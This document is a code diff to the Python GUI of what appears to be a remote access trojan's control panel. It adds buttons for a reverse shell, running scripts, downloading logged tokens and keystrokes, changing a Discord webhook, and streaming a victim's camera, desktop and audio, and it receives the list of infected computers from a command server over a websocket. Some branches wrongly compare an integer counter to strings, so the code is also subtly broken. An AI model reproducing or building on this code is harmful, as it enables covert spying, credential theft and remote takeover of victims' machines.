@@ -106,99 +106,83 @@ class Controller(customtkinter.CTkFrame):
             column = count % 4
             columnspan = 1
 
-            if not count:
+            if button_name == "Reverse Shell":
                 btn = customtkinter.CTkButton(
                     self, text=button_name, 
-                    command=lambda: Shell(master, target)
+                    command=lambda: Shell(master, target), 
+                    fg_color="#018f8f",
+                    text_color="white"
                 )
 
-                btn.grid(row=row, column=column, columnspan=columnspan, padx=5, pady=5, sticky="nsew")
-
-                continue
-
-            elif count == 1:
+            elif button_name == "Run Py script":
                 btn = customtkinter.CTkButton(
                     self, text=button_name, 
-                    command=lambda command=command: self.send_command(command, target, True)
+                    command=lambda command=command: self.send_command(command, target, True), 
+                    fg_color="#018f8f",
+                    text_color="white"
                 )
 
-                btn.grid(row=row, column=column, columnspan=columnspan, padx=5, pady=5, sticky="nsew")
-                continue
-
-            elif count == 4:
+            elif button_name == "Update Discord Webhook":
                 btn = customtkinter.CTkButton(
                     self, text=button_name, 
-                    command=lambda: self.get_webhook_input("Enter your new Webhook", target)
+                    command=lambda: self.get_webhook_input("Enter your new Webhook", target), 
+                    fg_color="#018f8f",
+                    text_color="white"
                 )
 
-                btn.grid(row=row, column=column, columnspan=columnspan, padx=5, pady=5, sticky="nsew")
-                continue
-
-            elif count == 14:
+            elif count == "Show Message Box":
                 btn = customtkinter.CTkButton(
                     self, text=button_name, 
-                    command=lambda: self.get_message_box(target)
+                    command=lambda: self.get_message_box(target), 
+                    fg_color="#018f8f",
+                    text_color="white"
                 )
 
-                btn.grid(row=row, column=column, columnspan=columnspan, padx=5, pady=5, sticky="nsew")
-                continue
-
-            elif count == 16:
+            elif count == "Logged Tokens":
                 btn = customtkinter.CTkButton(
                     self, text=button_name, 
-                    command=self.download_tokens
+                    command=self.download_tokens, 
+                    fg_color="#018f8f",
+                    text_color="white"
                 )
 
-                btn.grid(row=row, column=column, columnspan=columnspan, padx=5, pady=5, sticky="nsew")
-                continue
-
-            elif count == 17:
+            elif count == "Logged Keystrokes":
                 btn = customtkinter.CTkButton(
                     self, text=button_name, 
-                    command=self.download_keylogs
+                    command=self.download_keylogs, 
+                    fg_color="#018f8f",
+                    text_color="white"
                 )
 
-                btn.grid(row=row, column=column, columnspan=columnspan, padx=5, pady=5, sticky="nsew")
-                continue
+            elif command == "streamCamera":
+                btn = customtkinter.CTkButton(
+                    self, text=button_name, 
+                    command=lambda command=command: (self.send_command(command, target), Video(master, target, 0)), 
+                    fg_color="#018f8f",
+                    text_color="white"
+                )
 
-            if command:
-                # if row == 5:
-                #     columnspan = 1
-                #     column = 0
-                    
+            elif command == "streamDesktop":
+                btn = customtkinter.CTkButton(
+                    self, text=button_name, 
+                    command=lambda command=command: (self.send_command(command, target), Video(master, target, 1)), 
+                    fg_color="#018f8f",
+                    text_color="white"
+                )
 
-                if command == "streamCamera":
-                    btn = customtkinter.CTkButton(
-                        self, text=button_name, 
-                        command=lambda command=command: (self.send_command(command, target), Video(master, target, 0))
-                    )
+            elif command == "streamAudio":
+                btn = customtkinter.CTkButton(
+                    self, text=button_name, 
+                    command=lambda command=command: (self.send_command(command, target), Audio(master, target)), 
+                    fg_color="#018f8f",
+                    text_color="white"
+                )
 
-                    btn.grid(row=row, column=column, columnspan=columnspan, padx=5, pady=5, sticky="nsew")
+            else:
+                btn = customtkinter.CTkButton(self, text=button_name, command=lambda command = command: self.send_command(command, target), fg_color="#018f8f",
+                    text_color="white")
 
-                    continue
-
-                elif command == "streamDesktop":
-                    btn = customtkinter.CTkButton(
-                        self, text=button_name, 
-                        command=lambda command=command: (self.send_command(command, target), Video(master, target, 1))
-                    )
-
-                    btn.grid(row=row, column=column, columnspan=columnspan, padx=5, pady=5, sticky="nsew")
-
-                    continue
-
-                elif command == "streamAudio":
-                    btn = customtkinter.CTkButton(
-                        self, text=button_name, 
-                        command=lambda command=command: (self.send_command(command, target), Audio(master, target))
-                    )
-
-                    btn.grid(row=row, column=column, columnspan=columnspan, padx=5, pady=5, sticky="nsew")
-
-                    continue
-
-                btn = customtkinter.CTkButton(self, text=button_name, command=lambda command = command: self.send_command(command, target))
-                btn.grid(row=row, column=column, columnspan=columnspan, padx=5, pady=5, sticky="nsew")
+            btn.grid(row=row, column=column, columnspan=columnspan, padx=5, pady=5, sticky="ew")
 
     def send_message_box(self, frame, title, message, target):
         messagebox = self.messagebox
@@ -656,11 +640,11 @@ class App(customtkinter.CTk):
         while True:
             try:
                 self.computers = json.loads(ws.recv().replace("'", '"'))["computers"]
-            except (json.JSONDecodeError, websocket.WebSocketException, TypeError) as e:
+            except (json.JSONDecodeError, websocket.WebSocketException, TypeError, PermissionError, ConnectionError) as e:
                 try:
                     ws = create_connection(f"wss://{self.server_address}/api/ws/computers")
                     ws.send(self.server_key)
-                except (json.JSONDecodeError, websocket.WebSocketException) as e:
+                except (json.JSONDecodeError, websocket.WebSocketException, PermissionError, ConnectionError) as e:
                     pass
 
             self.ws = ws
